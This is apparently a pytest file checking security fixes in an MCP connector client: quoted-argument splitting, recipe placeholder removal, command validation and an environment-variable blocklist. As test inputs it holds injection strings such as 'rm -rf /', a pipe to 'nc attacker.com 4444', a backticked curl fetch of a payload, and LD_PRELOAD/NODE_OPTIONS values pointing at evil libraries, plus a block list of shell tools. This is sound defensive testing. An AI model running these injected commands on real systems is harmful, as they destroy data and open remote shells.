"""Tests for MCP security fixes F-01, F-03, F-11.

F-01: Command injection via /connector add-custom
F-03: Template injection via unsubstituted placeholders in recipes
F-11: shlex.split instead of str.split for quoted arguments
"""

from __future__ import annotations

import shlex

import pytest


# ---------------------------------------------------------------------------
# F-11: shlex.split handles quoted paths correctly
# ---------------------------------------------------------------------------

class TestShlexSplitUsage:
    """Verify MCP client uses shlex.split (not str.split) for commands."""

    def test_shlex_split_handles_quoted_path(self) -> None:
        """A command with a quoted path should keep the path as one token."""
        command = 'npx -y @modelcontextprotocol/server-filesystem "/home/user/my docs"'
        parts = shlex.split(command)
        assert parts == [
            "npx", "-y", "@modelcontextprotocol/server-filesystem",
            "/home/user/my docs",
        ]

    def test_shlex_split_handles_single_quotes(self) -> None:
        command = "npx -y @anthropic/mcp-server-sqlite '/tmp/my database.db'"
        parts = shlex.split(command)
        assert parts[-1] == "/tmp/my database.db"

    def test_shlex_split_handles_escaped_spaces(self) -> None:
        command = r"npx -y @server /path/with\ spaces"
        parts = shlex.split(command)
        assert parts[-1] == "/path/with spaces"

    def test_mcp_client_uses_shlex_split(self) -> None:
        """Confirm the actual MCP client source uses shlex.split for stdio."""
        import inspect
        from mycelos.connectors.mcp_client import MycelosMCPClient
        source = inspect.getsource(MycelosMCPClient._connect_stdio)
        assert "shlex.split" in source
        assert "self._command.split()" not in source


# ---------------------------------------------------------------------------
# F-03: Template placeholders removed from recipes
# ---------------------------------------------------------------------------

class TestRecipeTemplatePlaceholders:
    """Verify no recipe commands contain unsubstituted template placeholders."""

    def test_no_template_placeholders_in_commands(self) -> None:
        from mycelos.connectors.mcp_recipes import RECIPES
        for recipe_id, recipe in RECIPES.items():
            assert "{" not in recipe.command, (
                f"Recipe '{recipe_id}' command still contains a template placeholder: "
                f"{recipe.command}"
            )
            assert "}" not in recipe.command, (
                f"Recipe '{recipe_id}' command still contains a template placeholder: "
                f"{recipe.command}"
            )

    def test_filesystem_recipe_no_allowed_dirs(self) -> None:
        from mycelos.connectors.mcp_recipes import get_recipe
        recipe = get_recipe("filesystem")
        assert recipe is not None
        assert "{allowed_dirs}" not in recipe.command

    def test_sqlite_recipe_no_db_path(self) -> None:
        from mycelos.connectors.mcp_recipes import get_recipe
        recipe = get_recipe("sqlite")
        assert recipe is not None
        assert "{db_path}" not in recipe.command


# ---------------------------------------------------------------------------
# F-01: Command validation blocks injection
# ---------------------------------------------------------------------------

class TestCommandValidation:
    """Verify _validate_mcp_command blocks dangerous commands."""

    @pytest.fixture()
    def validate(self):
        from mycelos.chat.slash_commands import _validate_mcp_command
        return _validate_mcp_command

    def test_empty_command_rejected(self, validate) -> None:
        assert validate("") is not None
        assert validate("   ") is not None

    @pytest.mark.parametrize("char", [";", "|", "&", "$", "`", "(", ")", "{", "}", "<", ">", "!"])
    def test_shell_metacharacters_blocked(self, validate, char: str) -> None:
        result = validate(f"npx -y some-server {char} rm -rf /")
        assert result is not None
        assert "metacharacter" in result.lower() or "forbidden" in result.lower()

    @pytest.mark.parametrize("exe", ["bash", "sh", "zsh", "rm", "curl", "wget", "sudo", "nc"])
    def test_dangerous_executables_blocked(self, validate, exe: str) -> None:
        result = validate(f"{exe} -c 'malicious payload'")
        assert result is not None
        assert "blocked" in result.lower() or "dangerous" in result.lower()

    @pytest.mark.parametrize("exe", ["npx", "node", "python", "python3", "uvx", "docker"])
    def test_safe_executables_allowed(self, validate, exe: str) -> None:
        result = validate(f"{exe} -y @some/mcp-server")
        assert result is None, f"Expected '{exe}' to be allowed but got: {result}"

    def test_unknown_executable_rejected(self, validate) -> None:
        result = validate("my-random-binary --flag")
        assert result is not None
        assert "unknown" in result.lower()

    def test_path_based_executable_uses_basename(self, validate) -> None:
        # /usr/local/bin/npx should be allowed (basename is "npx")
        result = validate("/usr/local/bin/npx -y @server/test")
        assert result is None

    def test_path_bypass_blocked(self, validate) -> None:
        # /bin/bash should still be blocked
        result = validate("/bin/bash -c 'echo pwned'")
        assert result is not None

    def test_command_injection_via_semicolon(self, validate) -> None:
        result = validate("npx -y @server; rm -rf /")
        assert result is not None

    def test_command_injection_via_pipe(self, validate) -> None:
        result = validate("npx -y @server | nc attacker.com 4444")
        assert result is not None

    def test_command_injection_via_backtick(self, validate) -> None:
        result = validate("npx -y `curl attacker.com/payload`")
        assert result is not None

    def test_valid_npx_command_passes(self, validate) -> None:
        result = validate("npx -y @modelcontextprotocol/server-github")
        assert result is None


# ---------------------------------------------------------------------------
# Env var blocklist prevents LD_PRELOAD injection
# ---------------------------------------------------------------------------

class TestEnvVarBlocklist:
    """Verify _BLOCKED_ENV_VARS prevents dangerous env injection."""

    def test_blocked_env_vars_defined(self) -> None:
        from mycelos.connectors.mcp_client import _BLOCKED_ENV_VARS
        assert "LD_PRELOAD" in _BLOCKED_ENV_VARS
        assert "LD_LIBRARY_PATH" in _BLOCKED_ENV_VARS
        assert "DYLD_INSERT_LIBRARIES" in _BLOCKED_ENV_VARS
        assert "PYTHONPATH" in _BLOCKED_ENV_VARS
        assert "NODE_OPTIONS" in _BLOCKED_ENV_VARS

    def test_blocked_env_var_skipped_in_build_env(self) -> None:
        from mycelos.connectors.mcp_client import MycelosMCPClient
        client = MycelosMCPClient(
            connector_id="test",
            command="npx -y @test/server",
            env_vars={
                "LD_PRELOAD": "/tmp/evil.so",
                "SAFE_VAR": "safe_value",
                "DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib",
            },
        )
        env = client._build_env()
        assert "LD_PRELOAD" not in env
        assert "DYLD_INSERT_LIBRARIES" not in env
        assert env.get("SAFE_VAR") == "safe_value"

    def test_node_options_blocked(self) -> None:
        from mycelos.connectors.mcp_client import MycelosMCPClient
        client = MycelosMCPClient(
            connector_id="test",
            command="npx -y @test/server",
            env_vars={"NODE_OPTIONS": "--require /tmp/evil.js"},
        )
        env = client._build_env()
        assert "NODE_OPTIONS" not in env

    def test_credential_proxy_var_still_works(self) -> None:
        """Non-blocked env vars from credentials should still be injected."""
        from mycelos.connectors.mcp_client import MycelosMCPClient
        client = MycelosMCPClient(
            connector_id="test",
            command="npx -y @test/server",
            env_vars={"API_KEY": "secret123"},
        )
        env = client._build_env()
        assert env.get("API_KEY") == "secret123"
